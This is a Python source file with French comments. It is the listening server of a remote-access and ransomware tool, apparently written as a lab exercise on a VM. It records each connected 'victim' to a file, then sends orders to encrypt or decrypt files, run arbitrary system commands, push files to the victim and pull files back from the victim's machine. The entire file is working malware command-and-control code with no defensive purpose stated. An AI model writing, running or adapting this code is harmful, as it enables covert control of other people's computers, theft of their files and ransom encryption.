import socket  # Pour la communication réseau
import os      # Pour vérifier si les fichiers à envoyer existent

# Adresse permettant d'écouter toutes les interfaces réseau de la VM
ADRESSE_IP = '0.0.0.0' 
# Le port de communication choisi pour le serveur TCP
PORT_ECOUTE = 9526 

def demarrer_serveur():
    # Création du socket AF_INET = IPv4, SOCK_STREAM = TCP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serveur_socket:
        # Permet de relancer le script immédiatement sans attendre que le port se libère
        serveur_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Lie l'adresse IP et le port au socket créé
        serveur_socket.bind((ADRESSE_IP, PORT_ECOUTE))
        # Met le serveur en attente de connexions (mode écoute)
        serveur_socket.listen()
        print(f"Serveur en écoute sur le port {PORT_ECOUTE}...")

        # s.accept() bloque le programme jusqu'à ce qu'un client se connecte
        # Elle renvoie l'objet 'connexion' pour parler au client et son 'adresse'
        connexion, adresse_client = serveur_socket.accept()
        
        with connexion:
            print(f"Victime connectée : {adresse_client}")

            # .recv(1024) reçoit jusqu'à 1024 octets de données du client
            # .decode() transforme les octets reçus en texte lisible
            infos_recues = connexion.recv(1024).decode()
            print(f"Données de la victime : {infos_recues}")

            # Ouvre 'base_victimes.txt' pour ajouter du texte à la fin grace au mode "a" (append)
            with open("base_victimes.txt", "a") as victimes:
                # Écrit les infos reçues pour les stocker de façon persistante
                victimes.write(f"{adresse_client} -> {infos_recues}\n")

            # Boucle infinie pour envoyer des ordres tant qu'on ne quitte pas
            while True:
                # input() récupère ce que tu tapes au clavier
                ordre = input("Action (chiffrer/dechiffrer/system/upload/download/quitter) > ").strip().lower()

                # Si l'entrée est vide, on recommence la boucle
                if not ordre: 
                    continue
                
                # .encode() transforme le texte en octets pour l'envoi sur le réseau
                # .sendall() s'assure que tout le message est bien envoyé
                connexion.sendall(ordre.encode())

                # Sortie de la boucle si l'utilisateur veut arrêter
                if ordre == "quitter":
                    break

                # Si l'ordre est 'system', on demande quelle commande exécuter sur la victime
                if ordre == "system":
                    commande_shell = input("Commande système à envoyer : ")
                    # Envoie la commande spécifique après l'ordre 'system'
                    connexion.sendall(commande_shell.encode())
                
                elif ordre == "upload":
                    # Demande le nom du fichier présent sur le serveur à envoyer
                    nom_fichier = input("Fichier à envoyer au client : ")
                    # Envoie le nom du fichier au client pour qu'il sache comment l'appeler
                    connexion.sendall(nom_fichier.encode())
                    # Vérifie si le fichier existe bien localement
                    if os.path.exists(nom_fichier):
                        # Ouvre le fichier en lecture binaire
                        with open(nom_fichier, "rb") as f:
                            contenu = f.read()
                            # Envoie d'abord la taille du fichier (calibrée sur 16 caractères)
                            connexion.sendall(str(len(contenu)).encode().ljust(16))
                            # Envoie les données réelles du fichier
                            connexion.sendall(contenu)

                        # APRES l'envoi, on lit la confirmation du client 
                        # pour vider le buffer réseau avant de remonter au menu
                        confirmation = connexion.recv(1024).decode()
                        print("Fichier envoyé avec succès.")
                    else:
                        print("Fichier introuvable.")
                    # Remonte au début de la boucle sans attendre de réponse
                    continue

                elif ordre == "download":
                    # Demande quel fichier récupérer sur la machine de la victime
                    nom_fichier = input("Fichier à récupérer du client : ")
                    # Envoie le nom au client
                    connexion.sendall(nom_fichier.encode())
                    # Reçoit la taille du fichier (16 octets)
                    taille_brute = connexion.recv(16).decode().strip()
                    # Vérifie si le client a envoyé un message d'erreur au lieu d'une taille
                    if "ERREUR" in taille_brute:
                        print("Le client n'a pas trouvé le fichier.")
                    else:
                        # Reçoit les données selon la taille annoncée
                        donnees = connexion.recv(int(taille_brute))
                        # Sauvegarde le fichier avec un préfixe pour le distinguer
                        with open("DL_" + nom_fichier, "wb") as f:
                            f.write(donnees)
                        print(f"Fichier {nom_fichier} récupéré.")
                    # Remonte au début de la boucle sans attendre de réponse
                    continue

                # Attend la réponse du client (résultat du chiffrement ou de la commande)
                reponse_client = connexion.recv(4096).decode()
                print(f"\n[RETOUR CLIENT] :\n{reponse_client}")

demarrer_serveur()